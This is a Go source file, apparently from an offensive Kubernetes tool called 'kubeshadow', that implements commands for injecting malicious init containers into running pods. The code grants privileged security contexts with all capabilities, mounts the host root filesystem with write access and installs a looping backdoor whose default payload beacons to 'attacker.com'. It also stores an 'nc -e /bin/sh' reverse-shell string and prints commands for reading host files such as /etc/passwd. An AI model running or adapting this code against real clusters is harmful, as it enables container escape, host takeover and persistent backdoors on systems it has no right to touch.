package exploitation

import (
	"context"
	"fmt"

	"kubeshadow/pkg/logger"

	"github.com/spf13/cobra"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
)

// InitContainerCmd represents the init container command
var InitContainerCmd = &cobra.Command{
	Use:   "init-container",
	Short: "Inject malicious init containers for persistence and exploitation",
	Long: `Init Container Injection

Inject malicious init containers into pods for persistence and exploitation:
- Privileged init containers
- Host access via init containers
- Data exfiltration through init containers
- Persistence via init containers
- Backdoor installation through init containers

Examples:
  kubeshadow exploitation init-container inject --target-pod vulnerable-pod --namespace default --image alpine:latest --privileged
  kubeshadow exploitation init-container backdoor --target-pod web-app --namespace production --image busybox --payload "curl http://attacker.com/beacon"
  kubeshadow exploitation init-container persistence --target-pod database --namespace kube-system --image ubuntu:latest --host-access`,
	RunE: runInitContainer,
}

func runInitContainer(cmd *cobra.Command, args []string) error {
	action, _ := cmd.Flags().GetString("action")

	switch action {
	case "inject":
		return injectInitContainer(cmd)
	case "backdoor":
		return backdoorInitContainer(cmd)
	case "persistence":
		return persistenceInitContainer(cmd)
	case "list":
		return listInitContainers(cmd)
	case "cleanup":
		return cleanupInitContainers(cmd)
	default:
		return listInitContainerMethods()
	}
}

func listInitContainerMethods() error {
	fmt.Println("ðŸŽ¯ Available Init Container Methods")
	fmt.Println("===================================")
	fmt.Println("")
	fmt.Println("ðŸ“¦ Injection Methods:")
	fmt.Println("  inject      - Inject malicious init container")
	fmt.Println("  backdoor    - Create backdoor init container")
	fmt.Println("  persistence - Create persistence init container")
	fmt.Println("")
	fmt.Println("ðŸ” Management Methods:")
	fmt.Println("  list        - List existing init containers")
	fmt.Println("  cleanup     - Remove init containers")
	fmt.Println("")
	fmt.Println("ðŸ’¡ Usage Examples:")
	fmt.Println("  kubeshadow exploitation init-container inject --target-pod vulnerable-pod --namespace default --image alpine:latest --privileged")
	fmt.Println("  kubeshadow exploitation init-container backdoor --target-pod web-app --namespace production --image busybox --payload 'curl http://attacker.com/beacon'")
	fmt.Println("  kubeshadow exploitation init-container persistence --target-pod database --namespace kube-system --image ubuntu:latest --host-access")
	return nil
}

func injectInitContainer(cmd *cobra.Command) error {
	targetPod, _ := cmd.Flags().GetString("target-pod")
	namespace, _ := cmd.Flags().GetString("namespace")
	image, _ := cmd.Flags().GetString("image")
	command, _ := cmd.Flags().GetString("command")
	args, _ := cmd.Flags().GetString("args")
	privileged, _ := cmd.Flags().GetBool("privileged")
	hostAccess, _ := cmd.Flags().GetBool("host-access")
	kubeconfig, _ := cmd.Flags().GetString("kubeconfig")

	if targetPod == "" {
		return fmt.Errorf("target-pod is required")
	}
	if namespace == "" {
		namespace = "default"
	}
	if image == "" {
		image = "alpine:latest"
	}
	if command == "" {
		command = "/bin/sh"
	}
	if args == "" {
		args = "-c 'while true; do sleep 30; done'"
	}

	fmt.Printf("ðŸŽ¯ Injecting init container into %s/%s\n", namespace, targetPod)
	fmt.Println("=============================================")

	// Get Kubernetes client
	config, err := getKubeConfig(kubeconfig)
	if err != nil {
		return fmt.Errorf("failed to get Kubernetes config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return fmt.Errorf("failed to create Kubernetes clientset: %v", err)
	}

	// Get the target pod
	pod, err := clientset.CoreV1().Pods(namespace).Get(context.TODO(), targetPod, metav1.GetOptions{})
	if err != nil {
		return fmt.Errorf("failed to get pod %s: %v", targetPod, err)
	}

	// Create malicious init container
	initContainer := v1.Container{
		Name:    "malicious-init",
		Image:   image,
		Command: []string{command},
		Args:    []string{args},
	}

	// Add security context if privileged
	if privileged {
		initContainer.SecurityContext = &v1.SecurityContext{
			Privileged:               &[]bool{true}[0],
			RunAsUser:                &[]int64{0}[0],
			RunAsGroup:               &[]int64{0}[0],
			AllowPrivilegeEscalation: &[]bool{true}[0],
			Capabilities: &v1.Capabilities{
				Add: []v1.Capability{"ALL"},
			},
		}
	}

	// Add host access if requested
	if hostAccess {
		initContainer.VolumeMounts = []v1.VolumeMount{
			{
				Name:      "host-root",
				MountPath: "/host",
				ReadOnly:  false,
			},
		}
	}

	// Add environment variables
	initContainer.Env = []v1.EnvVar{
		{
			Name:  "INIT_INJECTED",
			Value: "true",
		},
		{
			Name:  "TARGET_POD",
			Value: targetPod,
		},
		{
			Name:  "NAMESPACE",
			Value: namespace,
		},
		{
			Name:  "SHELL_PAYLOAD",
			Value: "nc -e /bin/sh 10.0.0.1 4444",
		},
	}

	// Add init container to pod
	pod.Spec.InitContainers = append(pod.Spec.InitContainers, initContainer)

	// Add host volume if host access is requested
	if hostAccess {
		hostVolume := v1.Volume{
			Name: "host-root",
			VolumeSource: v1.VolumeSource{
				HostPath: &v1.HostPathVolumeSource{
					Path: "/",
					Type: &[]v1.HostPathType{v1.HostPathDirectory}[0],
				},
			},
		}
		pod.Spec.Volumes = append(pod.Spec.Volumes, hostVolume)
	}

	// Update the pod
	_, err = clientset.CoreV1().Pods(namespace).Update(context.TODO(), pod, metav1.UpdateOptions{})
	if err != nil {
		return fmt.Errorf("failed to inject init container: %v", err)
	}

	fmt.Println("âœ… Init container injected successfully!")
	fmt.Printf("ðŸ” To access the init container:\n")
	fmt.Printf("kubectl exec -it %s -n %s -c %s -- /bin/sh\n", targetPod, namespace, initContainer.Name)

	if hostAccess {
		fmt.Printf("ðŸŒ To access host filesystem:\n")
		fmt.Printf("kubectl exec -it %s -n %s -c %s -- ls -la /host/\n", targetPod, namespace, initContainer.Name)
	}

	return nil
}

func backdoorInitContainer(cmd *cobra.Command) error {
	targetPod, _ := cmd.Flags().GetString("target-pod")
	namespace, _ := cmd.Flags().GetString("namespace")
	image, _ := cmd.Flags().GetString("image")
	payload, _ := cmd.Flags().GetString("payload")
	kubeconfig, _ := cmd.Flags().GetString("kubeconfig")

	if targetPod == "" {
		return fmt.Errorf("target-pod is required")
	}
	if namespace == "" {
		namespace = "default"
	}
	if image == "" {
		image = "busybox:latest"
	}
	if payload == "" {
		payload = "curl http://attacker.com/beacon"
	}

	fmt.Printf("ðŸšª Creating backdoor init container in %s/%s\n", namespace, targetPod)
	fmt.Println("===============================================")

	// Get Kubernetes client
	config, err := getKubeConfig(kubeconfig)
	if err != nil {
		return fmt.Errorf("failed to get Kubernetes config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return fmt.Errorf("failed to create Kubernetes clientset: %v", err)
	}

	// Get the target pod
	pod, err := clientset.CoreV1().Pods(namespace).Get(context.TODO(), targetPod, metav1.GetOptions{})
	if err != nil {
		return fmt.Errorf("failed to get pod %s: %v", targetPod, err)
	}

	// Create backdoor init container
	backdoorContainer := v1.Container{
		Name:    "backdoor-init",
		Image:   image,
		Command: []string{"/bin/sh"},
		Args:    []string{"-c", fmt.Sprintf("while true; do %s; sleep 300; done", payload)},
		SecurityContext: &v1.SecurityContext{
			Privileged:               &[]bool{true}[0],
			RunAsUser:                &[]int64{0}[0],
			RunAsGroup:               &[]int64{0}[0],
			AllowPrivilegeEscalation: &[]bool{true}[0],
			Capabilities: &v1.Capabilities{
				Add: []v1.Capability{"ALL"},
			},
		},
		VolumeMounts: []v1.VolumeMount{
			{
				Name:      "host-root",
				MountPath: "/host",
				ReadOnly:  false,
			},
		},
		Env: []v1.EnvVar{
			{
				Name:  "BACKDOOR_MODE",
				Value: "true",
			},
			{
				Name:  "TARGET_POD",
				Value: targetPod,
			},
			{
				Name:  "NAMESPACE",
				Value: namespace,
			},
			{
				Name:  "PAYLOAD",
				Value: payload,
			},
		},
	}

	// Add backdoor init container to pod
	pod.Spec.InitContainers = append(pod.Spec.InitContainers, backdoorContainer)

	// Add host volume for backdoor access
	hostVolume := v1.Volume{
		Name: "host-root",
		VolumeSource: v1.VolumeSource{
			HostPath: &v1.HostPathVolumeSource{
				Path: "/",
				Type: &[]v1.HostPathType{v1.HostPathDirectory}[0],
			},
		},
	}
	pod.Spec.Volumes = append(pod.Spec.Volumes, hostVolume)

	// Update the pod
	_, err = clientset.CoreV1().Pods(namespace).Update(context.TODO(), pod, metav1.UpdateOptions{})
	if err != nil {
		return fmt.Errorf("failed to inject backdoor init container: %v", err)
	}

	fmt.Println("âœ… Backdoor init container injected successfully!")
	fmt.Printf("ðŸšª Backdoor payload: %s\n", payload)
	fmt.Printf("ðŸ” To access the backdoor container:\n")
	fmt.Printf("kubectl exec -it %s -n %s -c %s -- /bin/sh\n", targetPod, namespace, backdoorContainer.Name)

	fmt.Println("\nðŸ’¡ Backdoor commands:")
	fmt.Printf("kubectl exec -it %s -n %s -c %s -- ls -la /host/\n", targetPod, namespace, backdoorContainer.Name)
	fmt.Printf("kubectl exec -it %s -n %s -c %s -- cat /host/etc/passwd\n", targetPod, namespace, backdoorContainer.Name)
	fmt.Printf("kubectl exec -it %s -n %s -c %s -- ps aux\n", targetPod, namespace, backdoorContainer.Name)

	return nil
}

func persistenceInitContainer(cmd *cobra.Command) error {
	targetPod, _ := cmd.Flags().GetString("target-pod")
	namespace, _ := cmd.Flags().GetString("namespace")
	image, _ := cmd.Flags().GetString("image")
	hostAccess, _ := cmd.Flags().GetBool("host-access")
	kubeconfig, _ := cmd.Flags().GetString("kubeconfig")

	if targetPod == "" {
		return fmt.Errorf("target-pod is required")
	}
	if namespace == "" {
		namespace = "default"
	}
	if image == "" {
		image = "ubuntu:latest"
	}

	fmt.Printf("ðŸ”’ Creating persistence init container in %s/%s\n", namespace, targetPod)
	fmt.Println("===============================================")

	// Get Kubernetes client
	config, err := getKubeConfig(kubeconfig)
	if err != nil {
		return fmt.Errorf("failed to get Kubernetes config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return fmt.Errorf("failed to create Kubernetes clientset: %v", err)
	}

	// Get the target pod
	pod, err := clientset.CoreV1().Pods(namespace).Get(context.TODO(), targetPod, metav1.GetOptions{})
	if err != nil {
		return fmt.Errorf("failed to get pod %s: %v", targetPod, err)
	}

	// Create persistence init container
	persistenceContainer := v1.Container{
		Name:    "persistence-init",
		Image:   image,
		Command: []string{"/bin/bash"},
		Args:    []string{"-c", "echo 'Persistence established' > /tmp/persistence.log && while true; do sleep 3600; done"},
		SecurityContext: &v1.SecurityContext{
			Privileged:               &[]bool{true}[0],
			RunAsUser:                &[]int64{0}[0],
			RunAsGroup:               &[]int64{0}[0],
			AllowPrivilegeEscalation: &[]bool{true}[0],
			Capabilities: &v1.Capabilities{
				Add: []v1.Capability{"ALL"},
			},
		},
		Env: []v1.EnvVar{
			{
				Name:  "PERSISTENCE_MODE",
				Value: "true",
			},
			{
				Name:  "TARGET_POD",
				Value: targetPod,
			},
			{
				Name:  "NAMESPACE",
				Value: namespace,
			},
			{
				Name: "HOST_ACCESS",
				Value: func() string {
					if hostAccess {
						return "enabled"
					}
					return "disabled"
				}(),
			},
		},
	}

	// Add host access if requested
	if hostAccess {
		persistenceContainer.VolumeMounts = []v1.VolumeMount{
			{
				Name:      "host-root",
				MountPath: "/host",
				ReadOnly:  false,
			},
			{
				Name:      "host-etc",
				MountPath: "/host/etc",
				ReadOnly:  false,
			},
			{
				Name:      "host-var",
				MountPath: "/host/var",
				ReadOnly:  false,
			},
		}
	}

	// Add persistence init container to pod
	pod.Spec.InitContainers = append(pod.Spec.InitContainers, persistenceContainer)

	// Add host volumes if host access is requested
	if hostAccess {
		hostVolumes := []v1.Volume{
			{
				Name: "host-root",
				VolumeSource: v1.VolumeSource{
					HostPath: &v1.HostPathVolumeSource{
						Path: "/",
						Type: &[]v1.HostPathType{v1.HostPathDirectory}[0],
					},
				},
			},
			{
				Name: "host-etc",
				VolumeSource: v1.VolumeSource{
					HostPath: &v1.HostPathVolumeSource{
						Path: "/etc",
						Type: &[]v1.HostPathType{v1.HostPathDirectory}[0],
					},
				},
			},
			{
				Name: "host-var",
				VolumeSource: v1.VolumeSource{
					HostPath: &v1.HostPathVolumeSource{
						Path: "/var",
						Type: &[]v1.HostPathType{v1.HostPathDirectory}[0],
					},
				},
			},
		}
		pod.Spec.Volumes = append(pod.Spec.Volumes, hostVolumes...)
	}

	// Update the pod
	_, err = clientset.CoreV1().Pods(namespace).Update(context.TODO(), pod, metav1.UpdateOptions{})
	if err != nil {
		return fmt.Errorf("failed to inject persistence init container: %v", err)
	}

	fmt.Println("âœ… Persistence init container injected successfully!")
	fmt.Printf("ðŸ”’ To access the persistence container:\n")
	fmt.Printf("kubectl exec -it %s -n %s -c %s -- /bin/bash\n", targetPod, namespace, persistenceContainer.Name)

	if hostAccess {
		fmt.Println("\nðŸŒ Host access commands:")
		fmt.Printf("kubectl exec -it %s -n %s -c %s -- ls -la /host/\n", targetPod, namespace, persistenceContainer.Name)
		fmt.Printf("kubectl exec -it %s -n %s -c %s -- cat /host/etc/passwd\n", targetPod, namespace, persistenceContainer.Name)
		fmt.Printf("kubectl exec -it %s -n %s -c %s -- ls -la /host/var/log/\n", targetPod, namespace, persistenceContainer.Name)
	}

	fmt.Println("\nðŸ’¡ Persistence techniques:")
	fmt.Printf("kubectl exec -it %s -n %s -c %s -- echo 'Persistence established' > /tmp/persistence.log\n", targetPod, namespace, persistenceContainer.Name)
	fmt.Printf("kubectl exec -it %s -n %s -c %s -- crontab -l\n", targetPod, namespace, persistenceContainer.Name)

	return nil
}

func listInitContainers(cmd *cobra.Command) error {
	namespace, _ := cmd.Flags().GetString("namespace")
	kubeconfig, _ := cmd.Flags().GetString("kubeconfig")

	if namespace == "" {
		namespace = "default"
	}

	fmt.Printf("ðŸ” Listing init containers in namespace %s\n", namespace)
	fmt.Println("=============================================")

	// Get Kubernetes client
	config, err := getKubeConfig(kubeconfig)
	if err != nil {
		return fmt.Errorf("failed to get Kubernetes config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return fmt.Errorf("failed to create Kubernetes clientset: %v", err)
	}

	// List pods with init containers
	pods, err := clientset.CoreV1().Pods(namespace).List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		return fmt.Errorf("failed to list pods: %v", err)
	}

	fmt.Println("ðŸ“¦ Pods with init containers:")
	for _, pod := range pods.Items {
		if len(pod.Spec.InitContainers) > 0 {
			fmt.Printf("  Pod: %s\n", pod.Name)
			for _, initContainer := range pod.Spec.InitContainers {
				fmt.Printf("    - Init: %s (Image: %s)\n", initContainer.Name, initContainer.Image)
			}
		}
	}

	return nil
}

func cleanupInitContainers(cmd *cobra.Command) error {
	namespace, _ := cmd.Flags().GetString("namespace")
	confirm, _ := cmd.Flags().GetBool("confirm")
	kubeconfig, _ := cmd.Flags().GetString("kubeconfig")

	if !confirm {
		fmt.Println("âš ï¸  This will remove all init containers!")
		fmt.Println("Use --confirm flag to proceed")
		return nil
	}

	if namespace == "" {
		namespace = "default"
	}

	fmt.Printf("ðŸ§¹ Cleaning up init containers in namespace %s\n", namespace)
	fmt.Println("===============================================")

	// Get Kubernetes client
	config, err := getKubeConfig(kubeconfig)
	if err != nil {
		return fmt.Errorf("failed to get Kubernetes config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return fmt.Errorf("failed to create Kubernetes clientset: %v", err)
	}

	// List pods with init containers
	pods, err := clientset.CoreV1().Pods(namespace).List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		return fmt.Errorf("failed to list pods: %v", err)
	}

	// Remove init containers by updating pods
	for _, pod := range pods.Items {
		if len(pod.Spec.InitContainers) > 0 {
			// Create patch to remove init containers
			patch := `{
				"spec": {
					"initContainers": []
				}
			}`

			_, err := clientset.CoreV1().Pods(namespace).Patch(
				context.TODO(),
				pod.Name,
				"application/merge-patch+json",
				[]byte(patch),
				metav1.PatchOptions{},
			)
			if err != nil {
				logger.Error("Failed to remove init containers from pod %s: %v", pod.Name, err)
			} else {
				fmt.Printf("âœ… Removed init containers from pod %s\n", pod.Name)
			}
		}
	}

	fmt.Println("âœ… Init container cleanup completed!")
	return nil
}

func init() {
	InitContainerCmd.Flags().String("action", "list", "Action to perform (inject, backdoor, persistence, list, cleanup)")
	InitContainerCmd.Flags().String("target-pod", "", "Target pod for init container")
	InitContainerCmd.Flags().String("namespace", "default", "Target namespace")
	InitContainerCmd.Flags().String("image", "alpine:latest", "Container image to use")
	InitContainerCmd.Flags().String("command", "", "Command to run in init container")
	InitContainerCmd.Flags().String("args", "", "Arguments for the command")
	InitContainerCmd.Flags().String("payload", "", "Payload for backdoor init container")
	InitContainerCmd.Flags().Bool("privileged", false, "Run with privileged security context")
	InitContainerCmd.Flags().Bool("host-access", false, "Enable host filesystem access")
	InitContainerCmd.Flags().String("kubeconfig", "", "Path to kubeconfig file")
	InitContainerCmd.Flags().Bool("confirm", false, "Confirm destructive operations")
}
